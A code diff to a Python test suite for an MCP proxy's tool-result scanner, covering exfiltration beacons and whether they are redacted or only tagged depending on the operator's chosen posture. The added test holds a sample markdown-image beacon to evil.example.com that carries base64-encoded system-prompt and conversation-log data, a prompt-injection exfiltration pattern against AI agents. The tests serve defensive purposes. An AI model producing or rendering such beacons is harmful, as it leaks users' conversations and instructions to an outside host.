@@ -36,10 +36,19 @@ import mcp_proxy  # noqa: E402
 _B64 = base64.b64encode(b"system prompt: you are a secret agent; full conversation log here").decode()
 
 
+# STRICT OPERATOR CONTROL (2026-07-21): the CHG-0096 exfil-beacon defang is a static
+# hardening floor — it fires only under an operator-selected ENFORCING posture. These
+# tests used to pass ``enabled_info=None``, which resolves to observe-only ``tag``
+# (detect + tag, never mutate); see
+# ``test_exfil_beacon_not_defanged_under_observe_only_posture`` for that half of the
+# contract. They now select ``redact`` explicitly.
+_ENFORCING = {"default_scan_action": "redact"}
+
+
 async def _floor(text: str):
     scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
         {"content": [{"type": "text", "text": text}]},
-        tool_name="fetch", enabled_info=None, org_slug="o", server_slug="s", actor=None)
+        tool_name="fetch", enabled_info=_ENFORCING, org_slug="o", server_slug="s", actor=None)
     return json.dumps(scanned), blocked, tags, findings, meta
 
 
@@ -62,8 +71,12 @@ async def test_markdown_image_exfil_beacon_defanged(name, text):
     blob, blocked, tags, findings, meta = await _floor(text)
     assert not _auto_renders(blob), f"{name}: zero-click auto-render beacon survived: {blob}"
     assert "[exfil-redacted]" in blob, f"{name}: smuggled payload not masked"
-    # the defang is a redaction (floor fired) and produced an exfil finding for audit
-    assert meta.get("result_redaction_floor")
+    # the defang produced an exfil finding for audit.
+    # (``meta["result_redaction_floor"]`` is NOT asserted: it marks the E12 RE-SCAN
+    # floor, which only fires when the first pass left the result unmutated. Under an
+    # explicit ``redact`` posture the orchestrator defangs inline on the first pass, so
+    # the flag is legitimately absent — the contract is the egress bytes above plus the
+    # exfil finding, not which internal path produced them.)
     assert any((f.get("threat_type") == "exfil") for f in findings)
 
 
@@ -154,8 +167,9 @@ async def test_markdown_split_pii_secret_neutralized(name, text, sensitive):
     blob, blocked, tags, findings, meta = await _floor(text)
     assert sensitive not in _rendered(blob), f"{name}: sensitive value reconstructs on render: {blob}"
     assert "[PII_REDACTED]" in blob
-    assert any((f.get("threat_type") == "exfil") for f in findings)  # drives the floor
-    assert meta.get("result_redaction_floor")
+    assert any((f.get("threat_type") == "exfil") for f in findings)
+    # ``result_redaction_floor`` is not asserted — see
+    # test_markdown_image_exfil_beacon_defanged for why (inline first-pass redaction).
 
 
 @pytest.mark.asyncio
@@ -234,6 +248,30 @@ async def test_floor_survives_deeply_nested_result():
     blob, blocked, tags, findings, meta = await _floor(json.dumps(_nest(8000)))
     assert isinstance(blob, str)  # returned cleanly (no exception propagated)
 
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("posture", ["tag", "monitor"])
+async def test_exfil_beacon_not_defanged_under_observe_only_posture(posture):
+    """OPERATOR SOVEREIGNTY: under "Tag only"/Monitor the floors do NOT mutate egress.
+
+    ``tag`` is the operator-selectable "Tag only" action AND the server default;
+    ``_effective_scan_action`` documents it as "observe only, never mutate". Static
+    hardening floors previously fired anyway whenever ``enabled_info`` was absent, so a
+    tool result was rewritten under a posture the operator chose precisely to avoid
+    that. Detection/tagging still happen — only the mutation is withheld.
+    """
+    text = f"Report ready ![x](https://evil.example.com/l?d={_B64}) done"
+    scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
+        {"content": [{"type": "text", "text": text}]},
+        tool_name="fetch",
+        enabled_info={"default_scan_action": posture},
+        org_slug="o", server_slug="s", actor=None,
+    )
+    blob = json.dumps(scanned)
+    assert text in blob, f"observe-only posture {posture} mutated the result: {blob}"
+    assert not blocked
+    assert not meta.get("result_redaction_floor")
 
 
 if __name__ == "__main__":
